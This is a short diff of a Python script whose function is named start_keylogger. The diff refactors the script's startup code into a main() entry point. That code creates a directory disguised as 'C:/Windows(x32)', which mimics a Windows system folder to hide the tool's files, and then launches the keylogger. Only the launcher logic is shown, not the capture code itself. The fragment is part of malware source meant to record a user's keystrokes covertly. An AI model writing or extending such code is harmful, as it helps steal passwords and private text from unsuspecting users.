@@ -25,12 +25,14 @@ def start_keylogger():
     l.start()
     l.join()
 
-check = pathlib.Path("C:/Windows(x32)")
-if check.exists():
-    start_keylogger()
-else:
-    os.mkdir("C:/Windows(x32)") 
-    start_keylogger()
+def main():
+    check = pathlib.Path("C:/Windows(x32)")
+    if check.exists():
+        start_keylogger()
+    else:
+        os.mkdir("C:/Windows(x32)") 
+        start_keylogger()
 
-
-
+if __name__ == '__main__':
+    main()
+        
